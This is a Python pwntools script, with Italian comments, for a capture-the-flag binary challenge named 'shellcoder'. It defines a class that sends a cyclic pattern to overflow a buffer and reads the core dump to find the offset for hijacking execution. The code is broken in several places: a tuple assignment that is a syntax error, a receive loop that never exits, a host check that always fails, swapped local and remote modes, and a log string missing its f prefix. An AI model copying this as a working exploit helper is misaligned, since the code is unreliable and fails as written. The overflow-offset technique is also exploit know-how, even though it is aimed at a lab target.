#!/usr/bin/env python3

from pwn import *

def red(): return '\033[91m'
def green(): return '\033[92m'
def yellow(): return '\033[93m'
def blue(): return '\033[94m'
def reset(): return '\033[0m'

HOST = 'shellcoder.challs.cyberchallenge.it'
PORT = 38201
elf = context.binary = ELF('/home/giovanni/Desktop/cyber_challenge_repo/2026/binary/shellcoder/shellcoder/build/shellcoder', checksec=True)


class BinaryAnalyzer():

    def __init__(self, HOST: None, PORT: None, binary_path: None):
        self.HOST = HOST
        cond_host = self.verify_host
        if HOST and not cond_host:
            raise ValueError(f'{red()}Error while creating object: Invalid host.{reset()}')
        
        self.PORT = PORT
        cond_port = self.verify_port()
        if PORT and not cond_port:
            raise ValueError(f'{red()}Error while creating object: Invalid port.{reset()}')

        self.binary_path = binary_path
        cond_path = self.verify_path()
        if binary_path and not cond_path:
            raise ValueError(f'{red()}Error while creating object: Invalid path.{reset()}')

        self.elf = None
        self.architecture = None
        if binary_path:
            elf = ELF(binary_path, checksec=True)
            self.elf = context.binary = elf
            self.architecture = elf.arch

        self.mode = self.set_mode(cond_host, cond_port, cond_path)
        if self.is_ivalid():
            raise ValueError(f'{red()}Error while creating object: Something is missing!.{reset()}')
        
    def verify_host(self): # Frose mi ci devo collegare anche con la porta? È da capire!
        try: 
            result = subprocess.run(['ping', '-c', '4', self.HOST], capture_output=True, text=True)
            if result.returncode == 0:
                # Verifico se ci sono pacchetti ricevuti
                if "0 received" in result.stdout or re.search(r'(\d+) packets transmitted, 0 received', result.stdout):
                    print(f'{red()}Unreachable Host!{reset()}')
                    return False
                else:
                    log.success('The Host i reachable!{reset()}')
                    return False
            else:
                print(f'{red()}Ping Failed!')
                return False
        except Exception as e:
            print(f"{red()}Error: {e}{reset()}")
            return False

    def verify_port(self):
        try:
            if self.PORT and self.PORT < 0:
                print(f'{red()}Negative port: {self.PORT}{reset()}')
                return False
            # Mettere una condizione per le porte riservate IANA 0 - 1023?  
            if self.PORT > 65535:
                print(f'{red()}PORT cannot be greater than 65535: {self.PORT}')
                return False
            else:
                return True
        except Exception as e:
            print(f'{red()}Error: {e}{reset()}')
            return False
        
    def verify_path(self):
        try:
            if os.path.exists(self.binary_path):
                return True
            else:
                return False
        except Exception as e:
            print(f'{red()}Error: {e}{reset()}')
            return False
        
    def set_mode(self, host, port, path):
        if host and port and path:
            return 'MISC'
        elif host and port:
            return 'LOCAL'
        elif path:
            return 'REMOTE'
        else:
            return 'INVALID'

    def is_ivalid(self):
        return True if self.mode == 'INVALID' else False

    def is_misc(self):
        return True if self.mode == 'MISC' else False
    
    def is_local(self):
        return True if self.mode == 'LOCAL' else False
    
    def is_remote(self):
        return True if self.mode == 'REMOTE' else False

    def find_offset(self): ##aggiungere miglioramenti se si ha a che fare con un canary ecc. #TODO # e se le provassi tutte e mi faccio restituire la riga che da oveflow?
        """
        Invia un pattern ciclico per causare il crash, analizza il core dump
        e restituisce l'offset esatto per controllare il flusso di esecuzione.
        """
        
        # if self.is_invalid() ----> Già controllato nel costruttore
        p, arch = process(self.elf), self.architecture if (self.is_misc() or self.is_local()) else p = remote(self.HOST, self.PORT), None
        

        # 1. Generiamo un pattern sufficientemente lungo per causare il Buffer Overflow
        pattern_size = 500
        pattern = cyclic(pattern_size)
        
        
        while True:
            p.recvuntil(b"bytes?")
        
        # Passiamo la lunghezza del nostro pattern, e poi il pattern stesso
        p.send(p64(len(pattern))) 
        p.send(pattern)
        
        # 4. Aspettiamo che il programma vada in crash (Segmentation fault)
        p.wait()
        
        # 5. Leggiamo il file di core dump generato dal sistema operativo
        core = p.corefile
        
        # 6. Controlliamo l'architettura
        if elf.arch == 'amd64':  # Architettura 64-bit
            crash_value = core.read(core.regs.rsp, 8)  # Leggiamo 8 byte
        else:  # Architettura 32-bit
            crash_value = core.read(core.regs.esp, 4)  # Leggiamo 4 byte

        # 7. Troviamo a quale indice del pattern corrisponde quel valore
        offset = cyclic_find(crash_value)
        
        log.success(f"L'offset calcolato automaticamente è: {offset}")
        return offset
